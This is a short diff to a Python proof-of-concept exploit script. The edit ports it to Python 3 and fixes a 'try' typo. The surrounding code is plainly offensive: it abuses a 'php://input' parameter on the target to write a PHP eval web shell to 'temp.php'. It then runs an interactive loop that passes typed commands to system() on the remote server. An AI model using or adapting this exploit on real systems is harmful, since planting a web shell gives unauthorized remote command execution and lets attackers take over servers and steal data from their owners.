@@ -9,7 +9,7 @@ def poc():
 
 		payload = "?session=kejishidai&url=php://input&cms=temp.php"
 
-		password = raw_input("[*] Please enter the shell-password:")
+		password = input("[*] Please enter the shell-password:")
 		phpShell = "<?php eval($_POST['" + password + "']);?>"
 
 		url = target.url + payload
@@ -21,8 +21,8 @@ def poc():
 		print("[*] The shell password: " + password)
 
 		while 1:
-			tdry:
-				command = raw_input("[*] input the command:")
+			try:
+				command = input("[*] input the command:")
 				payload= 'system("%s");' % command
 				if command != "exit":
 					postdata = {
